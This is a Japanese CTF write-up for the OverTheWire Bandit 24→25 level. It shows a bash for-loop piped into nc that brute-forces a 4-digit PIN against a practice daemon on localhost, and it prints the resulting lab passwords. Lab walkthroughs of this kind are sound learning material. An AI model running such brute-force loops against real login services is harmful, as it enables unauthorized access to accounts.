@@ -1,0 +1,53 @@
+ポート番号30002で、デーモンがリッスンしているらしく、bandit24のパスと、４桁のピンコードを与えると、bandit25のパスをくれるらしい
+
+さらに、ピンコードの取得方法はブルートフォースしかない、とある
+
+最初は、どこかにシェルスクリプトなどを作成して、実行するのかと思ったが、どこかの回で使った/tmpの下のディレクトリではファイルを作成できず、どうするかと思っていたが、シェル芸的にワンライナーでいいんじゃね、と思いワンライナーで書いてみる
+
+書き方がわからなかったので、ググって、以下のサイトが参考になった
+
+http://qiita.com/yuya_presto/items/d1a50565f187c7c8ec76
+
+これの、シェルだけで、forループのワンライナーの項目を参考にして
+
+for i in {0001..9999}; do echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" $i; done
+
+と書いてみる、パスとピンコードの渡し方がわからなかったので、nc で繋いで確認してみる
+
+nc localhost 30002
+
+すると、
+
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+
+とレスポンスがきて、パスとピンコードを空白であければよいとわかる
+
+for i in {0001..9999}; do echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" $i; done |nc localhost 30002
+
+としてみるが、どうにもうまくいかない
+
+もしかして、echoだと改行が入っていないので、それが問題じゃないかと思い、
+
+for i in {0001..9999}; do echo -e "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" $i\\n; done |nc localhost 30002
+
+(eオプションで\nが改行として扱われる、さらに\をエスケープして、\\nとする)
+
+echoについて
+http://www.mazn.net/blog/2009/01/06/169.html
+
+上のワンライナーを実行すると、
+
+・・・・・・
+Wrong! Please enter the correct pincode. Try again.
+Fail! You did not supply enough data. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Fail! You did not supply enough data. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Fail! You did not supply enough data. Try again.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+
+よって、uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
